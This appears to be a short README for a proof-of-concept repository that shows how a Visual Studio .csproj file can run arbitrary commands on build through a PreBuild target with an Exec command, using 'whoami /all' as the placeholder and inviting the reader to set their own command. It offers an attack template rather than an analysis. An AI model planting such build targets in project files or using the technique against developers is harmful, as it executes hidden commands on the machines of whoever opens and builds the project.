# csproj-rce
Visual Studio RCE using `PreBuild` target on .csproj file

Use the `rce-proj.csproj` file to set your own command
```csproj
<Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="whoami /all" />
</Target>
```
